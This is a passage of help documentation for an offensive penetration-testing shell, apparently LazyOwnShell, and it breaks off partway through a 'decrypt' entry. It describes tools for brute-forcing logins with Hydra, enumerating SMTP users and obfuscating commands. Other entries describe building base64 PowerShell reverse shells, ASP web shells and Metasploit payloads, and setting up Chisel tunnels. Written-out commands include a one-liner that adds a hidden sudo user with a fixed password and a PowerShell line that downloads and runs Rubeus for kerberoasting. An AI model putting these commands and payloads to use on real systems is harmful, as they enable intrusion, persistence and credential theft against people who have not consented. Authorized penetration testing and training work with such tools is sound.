substitution key, and the string to be encoded. The format should be
‘<shift_value> <substitution_key> <string>’. :type line: str :returns:
None</p>
<p>Manual execution: To manually run this task, provide a shift value
(integer), a substitution key, and the string to encode in the format
<code>encode &lt;shift_value&gt; &lt;substitution_key&gt; &lt;string&gt;</code>.</p>
<p>Note: The function assumes the shift value is an integer. If the
shift value is not an integer, it will print an error message.</p>
<h2 id="decode">decode</h2>
<p>Decode a string using the specified shift value and substitution
key.</p>
<p>This function decodes the given string by applying a shift value and
a substitution key to reverse the encoding process.</p>
<p>Usage: decode <shift_value> <substitution_key> <string></p>
<p>:param line: The input string containing the shift value,
substitution key, and the string to be decoded. The format should be
‘<shift_value> <substitution_key> <string>’. :type line: str :returns:
None</p>
<p>Manual execution: To manually run this task, provide a shift value
(integer), a substitution key, and the string to decode in the format
<code>decode &lt;shift_value&gt; &lt;substitution_key&gt; &lt;string&gt;</code>.</p>
<p>Note: The function assumes the shift value is an integer. If the
shift value is not an integer, it will print an error message.</p>
<h2 id="creds">creds</h2>
<p>Display the credentials stored in the <code>credentials.txt</code>
file and copy the password to the clipboard.</p>
<p>This function reads the stored credentials from a file named
<code>credentials.txt</code> located in the <code>sessions</code>
directory. The file should be in the format
<code>username:password</code>. If the file does not exist, an error
message will be printed instructing the user to create the credentials
file first. The function extracts the username and password from the
file, prints them, and copies the password to the clipboard using
<code>xclip</code>.</p>
<p>:param line: A string parameter that is not used in this function. It
is included for compatibility with command-line interface functions.</p>
<p>:returns: None</p>
<p>Manual execution: To manually perform the equivalent actions, follow
these steps:</p>
<ol type="1">
<li>Ensure the file <code>sessions/credentials.txt</code> exists and
contains credentials in the format <code>username:password</code>.
<ol start="2" type="1">
<li><p>Read the file and extract the username and password.</p></li>
<li><p>Print the username and password to the console.</p></li>
<li><p>Use the <code>xclip</code> tool to copy the password to the
clipboard. Example command:</p>
<p>echo ‘<password>’ | xclip -sel clip</p></li>
</ol></li>
</ol>
<p>Example: If <code>sessions/credentials.txt</code> contains
<code>admin:password123</code>, the function will print:</p>
<p>User : admin Pass : password123</p>
<p>The password <code>password123</code> will be copied to the
clipboard.</p>
<p>Note: Ensure <code>xclip</code> is installed on your system for
copying to the clipboard. The function assumes that <code>xclip</code>
is available and correctly configured.</p>
<h2 id="rot">rot</h2>
<p>Apply a ROT (rotation) substitution cipher to the given string.</p>
<p>This function rotates each character in the input string by the
specified number of positions in the alphabet. It supports rotation
values between 1 and 27.</p>
<p>Usage: rot <number> ‘<string>’</p>
<p>:param line: The input string containing the number and the text to
be rotated. The format should be ‘<number>’<string>’ where <number> is
the rotation amount and <string> is the text to be ciphered. :type line:
str :returns: None</p>
<p>Manual execution: To manually run this task, provide a number
(rotation amount) and a string in the format
<code>rot &lt;number&gt; '&lt;string&gt;'</code>. Ensure the number is
between 1 and 27.</p>
<p>Note: The function assumes that the rotation number is an integer
between 1 and 27. If the number is out of range or not a valid integer,
it will print an error message.</p>
<h2 id="hydra">hydra</h2>
<p>Uses Hydra to perform a brute force attack on a specified HTTP
service with a user and password list.</p>
<ol type="1">
<li>Checks if a wordlist is provided; if not, prints an error
message.</li>
<li>Validates the remote host parameter.</li>
<li>Checks if the <code>line</code> argument is provided, which should
include the path to crack and the port.</li>
<li>If the <code>line</code> argument is valid, splits it into arguments
for the path and port.</li>
<li>Constructs and prints the Hydra command with the provided
parameters.</li>
<li>Executes the Hydra command using <code>os.system</code>.</li>
</ol>
<p>:param line: The path to crack and port for the Hydra command,
formatted as ‘path port’. :type line: str :returns: None</p>
<p>Manual execution: To manually run this task, you would: - Provide the
path to crack and the port as arguments to this function in the format
‘path port’. - Ensure that the user list and wordlist are set correctly.
- hydra -f -L sessions/users.txt -P /usr/share/wordlists/rockyou.txt
10.10.11.9 -s 5000 https-get /v2/ Note: Ensure that the remote host and
wordlist parameters are valid, and that the path and port are specified
correctly in the <code>line</code> argument.</p>
<h2 id="nmapscript">nmapscript</h2>
<p>Perform an Nmap scan using a specified script and port.</p>
<p>:param line: A string containing the Nmap script and port, separated
by a space. Example: “http-enum 80”.</p>
<p>:returns: None</p>
<p>Manual execution: To manually run an Nmap scan with a script and
port, use the following command format:</p>
nmap –script
<script>
<p>-p <port> <target> -oN <output-file></p>
<p>Example: If you want to use the script <code>http-enum</code> on port
<code>80</code> for the target <code>10.10.10.10</code>, you would
run:</p>
<pre><code>nmap --script http-enum -p 80 10.10.10.10 -oN sessions/webScan_10.10.10.10</code></pre>
<p>Ensure you have the target host (<code>rhost</code>) set in the
parameters and provide the script and port as arguments. The results
will be saved in the file
<code>sessions/webScan_&lt;rhost&gt;</code>.</p>
<h2 id="encoderpayload">encoderpayload</h2>
<p>Applies various obfuscations to a given command line string to create
multiple obfuscated versions.</p>
<ol type="1">
<li>Defines a helper function <code>double_base64_encode(cmd)</code>
that performs double Base64 encoding on a given command.</li>
<li>Defines the <code>apply_obfuscations(cmd)</code> function to create
a list of obfuscated commands using different techniques.</li>
<li>Applies these obfuscations to the provided <code>line</code>
argument and prints each obfuscated command.</li>
</ol>
<p>:param line: The command line string to be obfuscated. :type line:
str :returns: None</p>
<p>Manual execution: To manually run these tasks, you would: - Provide
the command you want to obfuscate as the argument to this function. -
The function will generate various obfuscated versions of the command
and print them.</p>
<p>Note: Ensure that the command is properly formatted and valid to
avoid errors during obfuscation. The obfuscations may involve different
encoding and string manipulation techniques.</p>
<h2 id="smtpuserenum">smtpuserenum</h2>
<p>Enumerates SMTP users using the <code>smtp-user-enum</code> tool with
the VRFY method.</p>
<ol type="1">
<li>Checks if the <code>rhost</code> (remote host) parameter is
set:</li>
</ol>
<ul>
<li>If not set, displays an error message and exits the function.</li>
</ul>
<ol start="2" type="1">
<li>Checks if the <code>usrwordlist</code> (user wordlist) parameter is
provided:</li>
</ol>
<ul>
<li>If not provided, displays an error message indicating that the
<code>p</code> or <code>payload</code> parameter should be used to load
payloads.</li>
</ul>
<ol start="3" type="1">
<li>If both parameters are provided:</li>
</ol>
<ul>
<li>Displays the command that will be executed for user
enumeration.</li>
<li>Runs
<code>sudo smtp-user-enum -M VRFY -U &lt;usrwordlist&gt; -t &lt;rhost&gt;</code>
to perform user enumeration.</li>
</ul>
<p>:param line: Not used in this function. :type line: str :returns:
None</p>
<p>Manual execution: To manually run these tasks, you would need to: -
Ensure that the <code>rhost</code> parameter is set with the target IP
address using <code>set rhost &lt;IP&gt;</code>. - Load the user
wordlist using the <code>set usrwordlist &lt;path&gt;</code> command. -
Execute the command
<code>sudo smtp-user-enum -M VRFY -U &lt;usrwordlist&gt; -t &lt;rhost&gt;</code>.
- Ex: sudo smtp-user-enum -M VRFY -U
/usr/share/wordlists/SecLists-master/Usernames/xato-net-10-million-usernames.txt
-t 10.10.10.10 Note: Ensure that you have the necessary permissions to
run <code>smtp-user-enum</code> with <code>sudo</code> and that the
wordlist file exists at the specified path.</p>
<h2 id="sshd">sshd</h2>
<p>Starts the SSH service and displays its status.</p>
<ol type="1">
<li>Executes the command to start the SSH service:</li>
</ol>
<ul>
<li>Runs <code>sudo systemctl start ssh</code> to initiate the SSH
service.</li>
</ul>
<ol start="2" type="1">
<li>Displays the status of the SSH service:</li>
</ol>
<ul>
<li>Runs <code>sudo systemctl status ssh</code> to show the current
status of the SSH service.</li>
</ul>
<p>:param line: Not used in this function. :type line: str :returns:
None</p>
<p>Manual execution: To manually run these tasks, you would need to: -
Execute <code>sudo systemctl start ssh</code> to start the SSH service.
- Run <code>sudo systemctl status ssh</code> to check the status of the
SSH service.</p>
<p>Note: Ensure that you have the necessary permissions to start
services using <code>sudo</code> and that the SSH service is installed
on your system.</p>
<h2 id="nmapscripthelp">nmapscripthelp</h2>
<p>Provides help to find and display information about Nmap scripts.</p>
<ol type="1">
<li>Checks if an argument is provided:</li>
</ol>
<ul>
<li>If no argument is given, displays an error message indicating the
need to pass a script name.</li>
</ul>
<ol start="2" type="1">
<li>Executes a command to display script help:</li>
</ol>
<ul>
<li>Runs <code>nmap --script-help</code> with the provided argument
(appending a wildcard <code>*</code> to match script names).</li>
<li>Prints a message with the command being executed and provides
further instructions for using the Nmap script.</li>
</ul>
<ol start="3" type="1">
<li>Prints a message suggesting the next step:</li>
</ol>
<ul>
<li>Provides a suggestion for running Nmap with the appropriate script
and options based on the search results.</li>
</ul>
<p>:param line: The script or keyword to search for in the Nmap script
help output. :type line: str :returns: None</p>
<p>Manual execution: To manually run these tasks, you would need to: -
Run <code>nmap --script-help</code> with the specific script name or
keyword. - Use the script names in Nmap commands to run scans with the
desired scripts.</p>
<p>Note: Ensure that <code>nmap</code> is installed and accessible in
the system’s PATH.</p>
<h2 id="apropos">apropos</h2>
<p>Search for commands matching the given parameter in the cmd interface
and optionally extend the search using the system’s <code>apropos</code>
command.</p>
<p>:param line: The search term to find matching commands.</p>
<p>:returns: None</p>
<p>Manual execution: To manually search for commands matching a term
using the <code>apropos</code> command, use the following command:</p>
<pre><code>apropos &lt;search_term&gt;</code></pre>
<p>Example: apropos network</p>
<p>The <code>apropos</code> command will search for commands and
documentation that match the given search term.</p>
<p>The function also searches within the available commands in the cmd
interface.</p>
<h2 id="searchhash">searchhash</h2>
<p>Helps to find hash types in Hashcat by searching through its help
output.</p>
<ol type="1">
<li>Checks if an argument is provided:</li>
</ol>
<ul>
<li>If no argument is given, displays an error message indicating the
need to pass a hash type.</li>
</ul>
<ol start="2" type="1">
<li>Executes a command to search for hash types:</li>
</ol>
<ul>
<li>Runs <code>hashcat -h</code> to display Hashcat help information and
pipes it to <code>grep</code> to search for the provided argument.</li>
<li>Prints a message with the command being executed and provides
further instructions for running Hashcat.</li>
</ul>
<ol start="3" type="1">
<li>Prints a message suggesting the next step:</li>
</ol>
<ul>
<li>Provides a suggestion for running Hashcat with the found hash
types.</li>
</ul>
<p>:param line: The hash type or keyword to search for in the Hashcat
help output. :type line: str :returns: None</p>
<p>Manual execution: To manually run these tasks, you would need to: -
Run <code>hashcat -h</code> to display the help information. - Use
<code>grep</code> to search for the specific hash type or keyword within
the help output. - Run Hashcat with the appropriate parameters based on
the search results.</p>
<p>Note: Ensure that <code>hashcat</code> is installed and accessible in
the system’s PATH.</p>
<h2 id="clean">clean</h2>
<p>Deletes various files and directories related to the session
cleanup.</p>
<ol type="1">
<li>Checks if the <code>rhost</code> parameter is valid:</li>
</ol>
<ul>
<li>Uses the <code>check_rhost</code> function to verify if
<code>rhost</code> is set and valid.</li>
<li>If <code>rhost</code> is not valid, exits the function.</li>
</ul>
<ol start="2" type="1">
<li>Executes a command to remove files and directories:</li>
</ol>
<ul>
<li>Deletes specific files and directories within the
<code>sessions</code> directory and other related locations.</li>
<li>The command is executed using <code>os.system</code>.</li>
</ul>
<ol start="3" type="1">
<li>Prints a message indicating that the cleanup is complete.</li>
</ol>
<p>:param line: This parameter is not used in the function. :type line:
str :returns: None</p>
<p>Manual execution: To manually run these tasks, you would need to: -
Ensure that you have the correct <code>rhost</code> value set. -
Manually execute the <code>rm</code> command to delete the specified
files and directories.</p>
<p>Note: This function performs a comprehensive cleanup by removing
various files and directories associated with the current session and
external resources.</p>
<h2 id="pyautomate">pyautomate</h2>
<p>Automates the execution of pwntomate tools on XML configuration
files.</p>
<ol type="1">
<li>Sets the directory for XML files to be processed:</li>
</ol>
<ul>
<li>Checks the <code>sessions</code> directory for XML files.</li>
</ul>
<ol start="2" type="1">
<li>For each XML file found:</li>
</ol>
<ul>
<li>Constructs and executes a command to run <code>pwntomate</code> with
the XML file as input.</li>
<li>The command is executed using <code>subprocess.run</code>, and
errors are handled if the command fails.</li>
</ul>
<ol start="3" type="1">
<li>After processing all XML files:</li>
</ol>
<ul>
<li>Prints a message indicating that the target has been
pwntomated.</li>
</ul>
<p>:param line: This parameter is not used in the function. :type line:
str :returns: None</p>
<p>Manual execution: To manually run these tasks, you would need to: -
Ensure that XML configuration files are present in the
<code>sessions</code> directory. - Run <code>pwntomate.py</code>
manually on each XML file using a similar command format.</p>
<p>Note: This function assumes that <code>pwntomate.py</code> is
available in the current working directory and is executable with Python
3.</p>
<h2 id="alias">alias</h2>
<p>Prints all configured aliases and their associated commands.</p>
<ol type="1">
<li>Retrieves the list of aliases from the <code>LazyOwnShell</code>
instance:</li>
</ol>
<ul>
<li>Iterates through each alias and its associated command.</li>
</ul>
<ol start="2" type="1">
<li>For each alias:</li>
</ol>
<ul>
<li>Displays the alias name and the full command it represents.</li>
</ul>
<p>:param line: This parameter is not used in the function. :type line:
str :returns: None</p>
<p>Manual execution: To manually run these tasks, you would need to: -
Ensure that aliases are configured in the <code>LazyOwnShell</code>
instance. - Manually review the aliases and their commands as
displayed.</p>
<p>Note: This function assumes that aliases are managed by the
<code>LazyOwnShell</code> instance and are available for retrieval.</p>
<h2 id="tcpdump_icmp">tcpdump_icmp</h2>
<p>Starts <code>tcpdump</code> to capture ICMP traffic on the specified
interface.</p>
<ol type="1">
<li>Checks if the <code>line</code> argument (interface) is
provided:</li>
</ol>
<ul>
<li>Displays an error message and exits if the interface is
missing.</li>
</ul>
<ol start="2" type="1">
<li>If the interface is provided:</li>
</ol>
<ul>
<li>Displays the <code>tcpdump</code> command that will be
executed.</li>
<li>Runs the <code>tcpdump</code> command to capture ICMP traffic on the
specified interface.</li>
</ul>
<p>:param line: The network interface on which to capture ICMP traffic
(e.g., <code>tun0</code>). :type line: str :returns: None</p>
<p>Manual execution: To manually run these tasks, you would need to: -
Provide a valid network interface for capturing ICMP traffic. - Execute
the <code>tcpdump</code> command manually to capture ICMP traffic on the
specified interface.</p>
<p>Note: Ensure that you have sufficient permissions to run
<code>tcpdump</code> on the specified interface.</p>
<h2 id="tcpdump_capture">tcpdump_capture</h2>
<p>Starts packet capture using <code>tcpdump</code> on the specified
interface.</p>
<ol type="1">
<li>Checks if the <code>line</code> argument (interface) is
provided:</li>
</ol>
<ul>
<li>Displays an error message and exits if the interface is
missing.</li>
</ul>
<ol start="2" type="1">
<li>Validates the <code>rhost</code> (remote host IP):</li>
</ol>
<ul>
<li>Exits the function if the <code>rhost</code> is not valid.</li>
</ul>
<ol start="3" type="1">
<li>If the interface and <code>rhost</code> are valid:</li>
</ol>
<ul>
<li>Displays the <code>tcpdump</code> command that will be
executed.</li>
<li>Runs the <code>tcpdump</code> command to capture packets on the
specified interface and save the capture file to
<code>pcaps/capture_&lt;rhost&gt;.pcap</code>.</li>
</ul>
<p>:param line: The network interface on which to capture packets (e.g.,
<code>tun0</code>). :type line: str :returns: None</p>
<p>Manual execution: To manually run these tasks, you would need to: -
Provide a valid network interface for capturing packets. - Ensure the
remote host IP is set correctly. - Execute the <code>tcpdump</code>
command manually to capture packets on the specified interface.</p>
<p>Note: Ensure that the <code>pcaps</code> directory exists and is
writable for saving the capture file.</p>
<h2 id="tshark_analyze">tshark_analyze</h2>
<p>Analyzes a packet capture file using <code>tshark</code> based on the
provided remote host IP.</p>
<ol type="1">
<li>Checks if the <code>rhost</code> (remote host IP) is valid:</li>
</ol>
<ul>
<li>Displays an error message and exits if the <code>rhost</code> is not
valid.</li>
</ul>
<ol start="2" type="1">
<li>Verifies the existence of the packet capture file:</li>
</ol>
<ul>
<li>Displays an error message and exits if the capture file is
missing.</li>
<li>Prompts the user to run the <code>do_tcpdump_capture</code> command
first.</li>
</ul>
<ol start="3" type="1">
<li>If the capture file exists:</li>
</ol>
<ul>
<li>Displays the <code>tshark</code> command that will be executed.</li>
<li>Runs the <code>tshark</code> command to analyze the packet capture
file and print out IP destination and frame time fields.</li>
</ul>
<p>:param line: The command line input specifying the interface for
capturing packets. :type line: str :returns: None</p>
<p>Manual execution: To manually run these tasks, you would need to: -
Ensure the remote host IP is valid. - Run the
<code>do_tcpdump_capture</code> command to capture packets. - Execute
the <code>tshark</code> command manually to analyze the packet capture
file.</p>
<p>Note: Ensure that the capture file
<code>pcaps/capture_&lt;rhost&gt;.pcap</code> is available in the
<code>pcaps</code> directory.</p>
<h2 id="rdp">rdp</h2>
<p>Reads credentials from a file, encrypts the password, and executes
the RDP connection command.</p>
<ol type="1">
<li>Reads credentials:
<ul>
<li>Reads the username and password from the
<code>sessions/credentials.txt</code> file.</li>
</ul></li>
<li>Encrypts the password:
<ul>
<li>Uses <code>remmina --encrypt-password</code> to encrypt the password
obtained from the file.</li>
</ul></li>
<li>Executes the RDP connection command:
<ul>
<li>Uses the encrypted password to construct and execute the
<code>remmina -c</code> command to initiate the RDP connection.</li>
</ul></li>
</ol>
<p>:param line: This function does not use any arguments. :type line:
str :returns: None</p>
<p>Manual execution: To manually execute the command: - Ensure
<code>sessions/credentials.txt</code> contains the credentials in the
format <code>username:password</code>. - Run the <code>rdp</code>
command to read the credentials, encrypt the password, and connect to
the RDP server. Example usage: <code>rdp</code></p>
<h2 id="base64encode">base64encode</h2>
<p>Encodes a given string into Base64 format.</p>
<ol type="1">
<li>Encodes the input string:
<ul>
<li>Uses the <code>base64</code> library to encode the provided string
into Base64 format.</li>
</ul></li>
<li>Displays the encoded string:
<ul>
<li>Prints the Base64 encoded string to the terminal.</li>
</ul></li>
</ol>
<p>:param line: The string to encode in Base64 format. :type line: str
:returns: None</p>
<p>Manual execution: To manually encode a string in Base64: - Provide
the string to the command and it will print the Base64 encoded result.
Example usage: <code>base64encode HelloWorld</code></p>
<h2 id="base64decode">base64decode</h2>
<p>Decodes a Base64 encoded string.</p>
<ol type="1">
<li>Decodes the Base64 string:
<ul>
<li>Uses the <code>base64</code> library to decode the provided Base64
encoded string back to its original form.</li>
</ul></li>
<li>Displays the decoded string:
<ul>
<li>Prints the decoded string to the terminal.</li>
</ul></li>
</ol>
<p>:param line: The Base64 encoded string to decode. :type line: str
:returns: None</p>
<p>Manual execution: To manually decode a Base64 encoded string: -
Provide the Base64 encoded string to the command and it will print the
decoded result. Example usage:
<code>base64decode SGVsbG9Xb3JsZA==</code></p>
<h2 id="grisun0">grisun0</h2>
<p>Creates and copies a shell command to add a new user
<code>grisun0</code>, set a password, add the user to the sudo group,
and switch to the user.</p>
<ol type="1">
<li>Displays the command:
<ul>
<li>Prints the command to add the user <code>grisun0</code> with home
directory <code>/home/.grisun0</code>, set the password, add the user to
the <code>sudo</code> group, set the appropriate permissions, and switch
to the user.</li>
</ul></li>
<li>Copies the command to clipboard:
<ul>
<li>Uses <code>xclip</code> to copy the command to the clipboard for
easy pasting.</li>
</ul></li>
</ol>
<p>:param line: This function does not use any arguments. :type line:
str :returns: None</p>
<p>Manual execution: To manually execute the command: - Copy the command
from the clipboard. - Run it in a terminal to create the user and set up
the permissions as specified. useradd -m -d /home/.grisun0 -s /bin/bash
grisun0 &amp;&amp; echo ‘grisun0:grisgrisgris’ | chpasswd &amp;&amp;
usermod -aG sudo grisun0 &amp;&amp; chmod 700 /home/.grisun0 &amp;&amp;
su - grisun0 Note: Ensure <code>xclip</code> is installed and available
on your system.</p>
<h2 id="winbase64payload">winbase64payload</h2>
<p>Creates a base64 encoded PowerShell payload specifically for Windows
to execute a <code>.ps1</code> script from <code>lhost</code>.</p>
<ol type="1">
<li>Checks if <code>lhost</code> is set:
<ul>
<li>Displays an error message and exits if <code>lhost</code> is not
set.</li>
</ul></li>
<li>Checks if a file name is provided:
<ul>
<li>Displays an error message and exits if no file name is
provided.</li>
</ul></li>
<li>Constructs a PowerShell command:
<ul>
<li>The command downloads and executes a <code>.ps1</code> script from
<code>lhost</code> using <code>New-Object WebClient</code>.</li>
</ul></li>
<li>Encodes the PowerShell command:
<ul>
<li>Converts the command to UTF-16LE encoding.</li>
<li>Encodes the UTF-16LE encoded command to base64.</li>
<li>Copies the final base64 command to the clipboard using
<code>xclip</code>.</li>
</ul></li>
</ol>
<p>:param line: The name of the <code>.ps1</code> file located in the
<code>sessions</code> directory. :type line: str :returns: None</p>
<p>Manual execution: To manually use the payload: - Ensure
<code>lhost</code> is set to the correct IP address. - Place the
<code>.ps1</code> file in the <code>sessions</code> directory. - Use
<code>xclip</code> to copy the generated base64 command to the
clipboard.</p>
<p>Note: Ensure <code>iconv</code>, <code>base64</code>, and
<code>xclip</code> are installed and available on your system.</p>
<h2 id="revwin">revwin</h2>
<p>Creates a base64 encoded PowerShell reverse shell payload
specifically for Windows to execute a <code>.ps1</code> script from
<code>lhost</code>.</p>
<ol type="1">
<li>Checks if <code>lhost</code> and <code>lport</code> are set and
valid:
<ul>
<li>Uses <code>check_lhost(lhost)</code> to verify the
<code>lhost</code> parameter.</li>
<li>Uses <code>check_lport(lport)</code> to verify the
<code>lport</code> parameter.</li>
<li>Exits the function if either <code>lhost</code> or
<code>lport</code> is invalid.</li>
</ul></li>
<li>Constructs a PowerShell reverse shell command with the following
structure:
<ul>
<li>Connects to the specified <code>lhost</code> and <code>lport</code>
using <code>TCPClient</code>.</li>
<li>Reads data from the TCP stream, executes it, and sends back the
results.</li>
<li>Appends the current path to the response for interactive use.</li>
</ul></li>
<li>Encodes the PowerShell command:
<ul>
<li>Encodes the command in UTF-16LE.</li>
<li>Converts the UTF-16LE encoded command to base64.</li>
<li>Creates a PowerShell command that executes the base64 encoded
payload.</li>
</ul></li>
<li>Copies the final PowerShell command to the clipboard:
<ul>
<li>Uses <code>xclip</code> to copy the command to the clipboard.</li>
</ul></li>
</ol>
<p>:param line: This parameter is not used in the function but is
present for consistency with the method signature. :type line: str
:returns: None</p>
<p>Manual execution: To manually use the payload: - Ensure
<code>lhost</code> and <code>lport</code> are correctly set. - Use
<code>xclip</code> to copy the generated PowerShell command to the
clipboard.</p>
<p>Note: Ensure <code>xclip</code> is installed and available on your
system.</p>
<h2 id="asprevbase64">asprevbase64</h2>
<p>Creates a base64 encoded ASP reverse shell payload and copies it to
the clipboard.</p>
<ol type="1">
<li>Checks if a base64 encoded payload is provided:
<ul>
<li>If no payload is provided, displays an error message and exits the
function.</li>
</ul></li>
<li>If a payload is provided:
<ul>
<li>Creates an ASP script that uses <code>WScript.Shell</code> to
execute a PowerShell command encoded in base64.</li>
<li>The created ASP script writes the result of the PowerShell command
to the response output.</li>
<li>Uses <code>xclip</code> to copy the ASP script to the clipboard with
the provided base64 encoded payload.</li>
</ul></li>
</ol>
<p>:param line: The base64 encoded payload to be used in the ASP reverse
shell. :type line: str :returns: None</p>
<p>Manual execution: To manually create the ASP payload: - Ensure you
have the base64 encoded payload ready. - Use <code>xclip</code> to copy
the provided command to the clipboard.</p>
<p>Note: Ensure <code>xclip</code> is installed and available on your
system. For help on creating the base64 encoded payload, see
<code>help winbase64payload</code>.</p>
<h2 id="rubeus">rubeus</h2>
<p>Copies a command to the clipboard for downloading and running
Rubeus.</p>
<ol type="1">
<li>Checks if <code>lhost</code> (local host IP) is set:
<ul>
<li>If <code>lhost</code> is not set, displays an error message and
exits the function.</li>
</ul></li>
<li>If <code>lhost</code> is set:
<ul>
<li>Displays a message indicating that the Rubeus downloader command has
been copied to the clipboard.</li>
<li>The copied command downloads Rubeus from the specified
<code>lhost</code> and saves it as <code>Rubeus.exe</code>.</li>
<li>Uses <code>xclip</code> to copy the following command to the
clipboard:</li>
<li><code>iwr -uri http://{lhost}/Rubeus.exe -OutFile Rubeus.exe ; .\Rubeus.exe kerberoast /creduser:domain.local\usuario /credpassword:password</code></li>
</ul></li>
</ol>
<p>:param line: Not used in this function. :type line: str :returns:
None</p>
<p>Manual execution: To manually run these tasks, you would need to: -
Ensure that <code>lhost</code> is set correctly. - Use
<code>xclip</code> to copy the provided command to the clipboard. -
Execute the downloaded Rubeus executable with the provided
arguments.</p>
<p>Note: Ensure <code>xclip</code> is installed and available on your
system.</p>
<h2 id="socat">socat</h2>
<p>Sets up and runs a <code>socat</code> tunnel with SOCKS4A proxy
support.</p>
<ol type="1">
<li><p>If no <code>line</code> (IP:port) argument is provided:</p>
<ul>
<li>Displays an error message indicating the need to pass
<code>ip:port</code>.</li>
<li>Exits the function.</li>
</ul></li>
<li><p>Displays a message instructing the user to configure
<code>socks5</code> at <code>127.0.0.1:1080</code> in
<code>/etc/proxychains.conf</code>.</p></li>
<li><p>If a valid <code>line</code> argument is provided:</p>
<ul>
<li>Displays the command being run:
<code>socat TCP-LISTEN:1080,fork SOCKS4A:localhost:{line},socksport=1080</code>.</li>
<li>Executes the <code>socat</code> command to listen on port 1080 and
forward traffic to the specified IP and port using SOCKS4A proxy.</li>
<li>Prints a shutdown message for the <code>socat</code> tunnel at port
1080.</li>
</ul></li>
</ol>
<p>:param line: The IP and port (formatted as <code>ip:port</code>) to
forward traffic to through the SOCKS4A proxy. :type line: str :returns:
None</p>
<p>Manual execution: To manually run these tasks, you would need to: -
Configure the <code>socks5</code> proxy settings in
<code>/etc/proxychains.conf</code>. - Use the <code>socat</code> command
with appropriate IP and port.</p>
<p>Note: Ensure that <code>socat</code> is installed and properly
configured on your system.</p>
<h2 id="chisel">chisel</h2>
<p>Automates the setup and execution of Chisel server and client for
tunneling and port forwarding.</p>
<ol type="1">
<li>If no <code>lhost</code> (local host IP) is set:
<ul>
<li>Displays an error message indicating the need to set
<code>lhost</code> using the <code>set</code> command.</li>
<li>Exits the function.</li>
</ul></li>
<li>If no port argument is provided:
<ul>
<li>Displays an error message indicating the need to provide a port
number.</li>
<li>Exits the function.</li>
</ul></li>
<li>If required Chisel files are not present:
<ul>
<li>Displays an error message prompting the user to run the
<code>download_resources</code> command.</li>
<li>Exits the function.</li>
</ul></li>
<li>If a valid port is provided:
<ul>
<li>Displays usage instructions for the Linux and Windows payloads.</li>
<li>Constructs and copies the appropriate Chisel command to the
clipboard based on user choice (1 for Windows, 2 for Linux).</li>
<li>Extracts and sets up Chisel binaries for Linux and Windows from
compressed files.</li>
<li>Runs the Chisel server on the specified port and prints a shutdown
message.</li>
</ul></li>
</ol>
<p>:param line: The command line input containing the port number for
Chisel setup. :type line: str :returns: None</p>
<p>Manual execution: To manually run these tasks, you would need to: -
Ensure <code>lhost</code> is set using
<code>set lhost &lt;IP&gt;</code>. - Provide the port number when
calling the function. - Run the command <code>download_resources</code>
if the Chisel files are missing. - Manually execute the Chisel commands
for Linux or Windows as copied to the clipboard.</p>
<p>Note: Ensure that all required files
(<code>chisel_1.9.1_linux_amd64.gz</code> and
<code>chisel_1.9.1_windows_amd64.gz</code>) are available in the
<code>sessions</code> directory.</p>
<h2 id="msf">msf</h2>
<p>Automates various Metasploit tasks including scanning for
vulnerabilities, setting up reverse shells, and creating payloads.</p>
<ol type="1">
<li>If no arguments are provided:
<ul>
<li>Retrieves the target IP (<code>rhost</code>) from parameters.</li>
<li>Checks if the IP is valid using <code>check_rhost()</code>. If
invalid, exits the function.</li>
<li>Creates a Metasploit resource script
(<code>/tmp/scan_vulnerabilities.rc</code>) that includes commands for
scanning ports, enumerating services, and checking for known
vulnerabilities.</li>
<li>Executes Metasploit with the created resource script and then
deletes the temporary file.</li>
<li>Prints a shutdown message after running the scan.</li>
</ul></li>
<li>If the argument starts with “rev”:
<ul>
<li>Sets up a reverse shell payload based on the specified platform and
user choice (with or without meterpreter).</li>
<li>Creates a Metasploit resource script (<code>/tmp/handler.rc</code>)
for handling incoming reverse shell connections.</li>
<li>Executes Metasploit with the created resource script and then
deletes the temporary file.</li>
<li>Prints a shutdown message after setting up the handler.</li>
</ul></li>
<li>If the argument starts with “lnk”:
<ul>
<li>Configures parameters (<code>lhost</code>, <code>lport</code>) for
creating a payload.</li>
<li>Uses <code>msfvenom</code> to generate a payload executable and
saves it in the <code>sessions</code> directory.</li>
<li>Creates an XML file (<code>download_payload.xml</code>) that will be
used to download and execute the payload on a target machine.</li>
<li>Creates a PowerShell script (<code>create_lnk.ps1</code>) to
generate a shortcut file (<code>.lnk</code>) pointing to the
payload.</li>
<li>Prints instructions and generates a command to copy to the clipboard
for setting up the payload and files.</li>
</ul></li>
<li>If the argument starts with “autoroute”:
<ul>
<li>Configures parameters for setting up a Metasploit session and
autorouting.</li>
<li>Creates a Metasploit resource script
(<code>/tmp/autoroute.rc</code>) to handle exploit sessions and set up
autorouting.</li>
<li>Executes Metasploit with the resource script and starts a SOCKS
proxy for routing traffic.</li>
<li>Configures proxychains to use the Metasploit SOCKS proxy and prints
instructions for using proxychains with tools.</li>
</ul></li>
</ol>
<p>:param line: The command line input that determines which Metasploit
task to automate. :type line: str :returns: None</p>
<p>Manual execution: To manually run these tasks, you would need to: -
For scanning: Create and run the resource script using
<code>msfconsole -r /tmp/scan_vulnerabilities.rc</code>. - For reverse
shells: Configure and run the resource script with the appropriate
payload settings. - For payload generation and shortcuts: Use
<code>msfvenom</code> and create XML and PowerShell scripts as
specified. - For autorouting: Create and run the resource script for
autorouting and configure proxychains.</p>
<p>Note: Ensure all required parameters (<code>lhost</code>,
<code>lport</code>, etc.) are set before running these tasks.</p>
<h2 id="encrypt">encrypt</h2>
<p>Encrypts a file using XOR encryption.</p>
<ol type="1">
<li>Splits the provided <code>line</code> into <code>file_path</code>
and <code>key</code> arguments.</li>
<li>Checks if the correct number of arguments (2) is provided; if not,
prints an error message and returns.</li>
<li>Reads the file specified by <code>file_path</code>.</li>
<li>Encrypts the file contents using the
<code>xor_encrypt_decrypt</code> function with the provided
<code>key</code>.</li>
<li>Writes the encrypted data to a new file with the “.enc” extension
added to the original file name.</li>
<li>Prints a message indicating the file has been encrypted.</li>
<li>Catches and handles the <code>FileNotFoundError</code> exception if
the specified file does not exist, and prints an error message.</li>
</ol>
<p>:param line: A string containing the file path and the key separated
by a space. :type line: str :returns: None</p>
<p>Manual execution: To manually run this command, use the following
syntax: encrypt <file_path> <key> Replace <code>&lt;file_path&gt;</code>
with the path to the file to be encrypted and <code>&lt;key&gt;</code>
with the encryption key.</p>
<h2 id="decrypt">decrypt</h2>
<p>Decrypts a file using XOR encryption.</p>
<ol type="1">
<li>Splits the provided <code>line</code> into <code>file_path</code>
and <code>key</code> arguments.</li>
<li>Checks if the correct number of arguments (2) is provided; if not,
